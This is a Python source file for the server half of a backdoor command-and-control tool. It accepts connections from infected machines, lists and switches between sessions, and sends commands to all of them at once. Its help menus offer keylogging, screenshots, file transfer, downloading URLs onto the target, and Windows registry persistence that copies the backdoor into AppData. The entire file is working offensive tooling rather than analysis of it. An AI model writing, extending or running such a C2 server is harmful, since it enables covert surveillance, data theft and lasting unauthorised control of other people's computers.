# Standard library imports
import json
import os
import select
import socket
import ssl
import sys
import time
import threading

# Local application/library specific imports
from colour import banner, Colour

# Variables
heartbeat_timeout = 60
heartbeat_wait = 1

def reliable_recv(target):
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def reliable_send(target, data):
    jsondata = json.dumps(data)
    while True:
        try:
            target.send(jsondata.encode())
            break
        except BrokenPipeError:
            # print("Connection to target lost.")
            break
        except Exception as e:
            print(f"An unexpected error occurred: {e}")
            break


# This function is to stop server.py issuing reliable_send if command='help' or 'clear'
# Creates less network traffic.
def exclusion_words(command):
    exclusion_words = ['help', 'clear']  # make this global variable
    if command == exclusion_words:
        return 1


def upload_file(target, file_name):
    f = open(file_name, 'rb')
    target.send(f.read())


def download_file(target, file_name):
    f = open(file_name, 'wb')
    target.settimeout(2)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()


def screenshot(target, count):
    directory = './screenshots'
    if not os.path.exists(directory):
        os.makedirs(directory)
    f = open(directory + '/screenshot_%d.png' % (count), 'wb')  # if target=Linux then #apt-get install scrot
    target.settimeout(3)
    try:
        chunk = target.recv(10485760)  # 10MB
    except:
        pass

    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(10485760)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()
    count += 1


# TODO: webcam(target) takes a quick webcam image
# https://stackoverflow.com/a/69282582/4443012

# TODO: encrypt()
# TODO: decrypt() functions using RSA library AES128-GCM

# TODO: use Flask to create a frontend UI in the web browser to manage C2 https://github.com/Tomiwa-Ot/moukthar


def server_help_manual():
    print('''\n
    quit                                --> Quit Session With The Target
    clear                               --> Clear The Screen
    background / bg                     --> Send Session With Target To Background
    cd *Directory name*                 --> Changes Directory On Target System
    upload *file name*                  --> Upload File To The Target Machine From Working Dir 
    download *file name*                --> Download File From Target Machine
    get *url*                           --> Download File From Specified URL to Target ./
    keylog_start                        --> Start The Keylogger
    keylog_dump                         --> Print Keystrokes That The Target From taskmanager.txt
    keylog_stop                         --> Stop And Self Destruct Keylogger File
    screenshot                          --> Takes screenshot and sends to server ./screenshots/
    start *programName*                 --> Spawn Program Using backdoor e.g. 'start notepad'
    remove_backdoor                     --> Removes backdoor from target!!!
    
    ===Windows Only===
    persistence *RegName* *filename*    --> Create Persistence In Registry
                                            copies backdoor to ~/AppData/Roaming/filename
                                            example: persistence Backdoor windows32.exe
    check                               --> Check If Has Administrator Privileges


    \n''')


def c2_help_manual():
    print('''\n
    ===Command and Control (C2) Manual===

    targets                 --> Prints Active Sessions
    session *session num*   --> Will Connect To Session (background to return)
    clear                   --> Clear Terminal Screen
    exit                    --> Quit ALL Active Sessions and Closes C2 Server!!
    kill *session num*      --> Issue 'quit' To Specified Target Session
    sendall *command*       --> Sends The *command* To ALL Active Sessions (sendall notepad)
    \n''')


def target_communication(target, ip):
    count = 0
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(target, command)
        if command == 'quit':
            break
        elif command == 'background' or command == 'bg':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(target, command[7:])
        elif command[:8] == 'download':
            download_file(target, command[9:])
        elif command[:10] == 'screenshot':
            screenshot(target, count)
            count = count + 1
        elif command == 'help':
            server_help_manual()
        else:
            result = reliable_recv(target)
            print(result)


def accept_connections():
    while True:
        if stop_flag:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            targets.append(target)
            ips.append(ip)
            # print(termcolor.colored(str(ip) + ' has connected!', 'green'))
            print(Colour().green(str(ip) + ' has connected!') +
                  '\n[**] Command & Control Center: ', end="")
        except:
            pass


def close_all_connections(targets):
    for target in targets:
        reliable_send(target, 'quit')
        target.close()


def send_heartbeat(target):
    while True:
        reliable_send(target, 'heartbeat')
        time.sleep(10)  # adjust the sleep time as needed


def send_heartbeat_to_all_targets(targets):
    
    while True:
        for target in targets:
            reliable_send(target, 'heartbeat')
            start_time = time.time()
            while True:
                if time.time() - start_time > heartbeat_timeout:  # timeout after 10 seconds
                    print(f"Target {target} did not respond to heartbeat. It might be down.", end="")
                    c2_input_text()
                    # handle target not responding here (e.g., remove from list, try to reconnect, etc.)
                    break
                try:
                    message = reliable_recv(target)
                    if message == 'heartbeat_ack':
                        break  # heartbeat acknowledged, break inner loop and move to next target
                except Exception as e:
                    print(f"An error occurred while waiting for heartbeat acknowledgment: {e}", end="")
                    c2_input_text()
                    break  # if an error occurred, break inner loop and move to next target
        time.sleep(heartbeat_wait)  # adjust the sleep time as needed


def c2_input_text():
    print('\n[**] Command & Control Center: ', end="")


def show_targets(ips):
    counter = 0
    for ip in ips:
        print('Session ' + str(counter) + ' --- ' + str(ip))
        counter += 1

def graceful_exit():
    try:
        # Your script's code...
        if input('\nDo you want to exit? yes/no: ') == 'yes':
            sys.exit()  # Use sys.exit() instead of quit()
    except KeyboardInterrupt:
        print("\nInterrupted by user. Exiting...")
        sys.exit()
    except SystemExit:
        # Handle the SystemExit exception. You could do some cleanup here if necessary.
        print("\nExiting the script...")
        sys.exit()  # Exit the script
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        sys.exit(1)  # Exit the script with an error status code


def kill_target(targets, ips, command):
    """
    Kills a target specified in the command.
    Args:
        targets (list): The list of targets.
        ips (list): The list of IPs.
        command (str): The command that specifies which target to kill.
    """
    target_index = int(command[5:])
    target = targets[target_index]
    ip = ips[target_index]
    reliable_send(target, 'quit')
    target.close()
    targets.remove(target)
    ips.remove(ip)


def send_all(targets, command):
    """
    Sends a command to all targets.
    Args:
        targets (list): The list of targets to send the command to.
        command (str): The command to send.
    """
    target_count = len(targets)
    print(Colour.blue(f'Number of sessions {target_count}'))
    print(Colour.green('Target sessions!'))
    i = 0
    try:
        while i < target_count:
            target = targets[i]
            print(target)
            reliable_send(target, command)
            i += 1
    except Exception as e:
        print(f'Failed to send command to all targets. Error: {e}')

def handle_session_command(targets, ips, command):
    """
    Handles a 'session' command.
    Args:
        targets (list): The list of targets.
        ips (list): The list of IPs.
        command (str): The command to handle.
    """
    try:
        session_id = int(command[8:])
        target = targets[session_id]
        ip = ips[session_id]
        target_communication(target, ip)
    except Exception as e:
        print('[-] No Session Under That ID Number. Error: ', e)


def exit_all(targets, sock, t1):
    """
    Exits all connections with targets, closes the socket, and stops the thread.
    Args:
        targets (list): The list of targets to disconnect from.
        sock (socket): The socket to close.
        t1 (Thread): The thread to stop.
    """
    stop_flag = True
    for target in targets:
        reliable_send(target, 'quit')
        target.close()
    sock.close()
    t1.join()


def list_targets(ips):
    """
    Lists all the targets.
    Args:
        ips (list): The list of IPs.
    """
    for counter, ip in enumerate(ips):
        print('Session ' + str(counter) + ' --- ' + str(ip))


def clear_c2_console():
    """
    Clears the console.
    """
    os.system('clear')


def print_command_does_not_exist():
    """
    Prints a message indicating that the command does not exist.
    """
    print(Colour().red('[!!] Command Doesn\'t Exist'), end=" - ")
    print(Colour.yellow('Try running `help` command'), end="\n")


def handle_keyboard_interrupt():
    """
    Handles KeyboardInterrupt and SystemExit exceptions.
    """
    print(Colour().blue('\nPlease use "exit" command'))


def handle_value_error(e):
    """
    Handles ValueError exceptions.
    Args:
        e (Exception): The exception to handle.
    """
    print(Colour().red('[!!] ValueError: ' + str(e)))


def initialise_socket():
    """
    Initializes the socket.
    Returns:
        The initialized socket.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', 5555))
    sock.listen(5)
    return sock


def start_accepting_connections(sock):
    """
    Starts a thread to accept connections.
    Args:
        sock (socket): The socket on which to accept connections.
    Returns:
        The thread object.
    """
    t1 = threading.Thread(target=accept_connections)
    t1.start()
    return t1


def print_banner_and_initial_info():
    """
    Prints the banner and information messages.
    """
    print(banner())
    print('Run "help" command to see the usage manual')
    print(Colour().green('[+] Waiting For The Incoming Connections ...'))

if __name__ == '__main__':
    targets = []
    ips = []
    stop_flag = False

    sock = initialise_socket()

    t1 = start_accepting_connections(sock)

    print_banner_and_initial_info()

    while True:
        try:
            command = input('[**] Command & Control Center: ')
            if command == 'targets':
                list_targets(ips)
            elif command == 'clear':
                clear_c2_console()
            elif command[:7] == 'session':
                handle_session_command(targets, ips, command)
            elif command == 'exit':
                for target in targets:
                    reliable_send(target, 'quit')
                    target.close()
                sock.close()
                stop_flag = True
                t1.join()
                print(Colour().yellow('\n[-] C2 Socket Closed! Bye!!'))
                break
            elif command[:4] == 'kill':
                kill_target(targets, ips, command)
            elif command[:7] == 'sendall':
                send_all(targets, command)
            elif command[:4] == 'help':
                c2_help_manual()
            elif command[:9] == 'heartbeat':
                continue
            elif command == 'heartbeat_all':
                continue
            else:
                print_command_does_not_exist()
        except (KeyboardInterrupt, SystemExit):
            handle_keyboard_interrupt()
        except ValueError as e:
            handle_value_error(e)

# TODO: encrypt connection
# TODO: Implement a 'pulse' feature between server and backdoor (Keep alive)
# This will ensure if server.py crashes the backdoor will after 60s will realise server is not listen on socket
# and will attempt to run connection() function again.
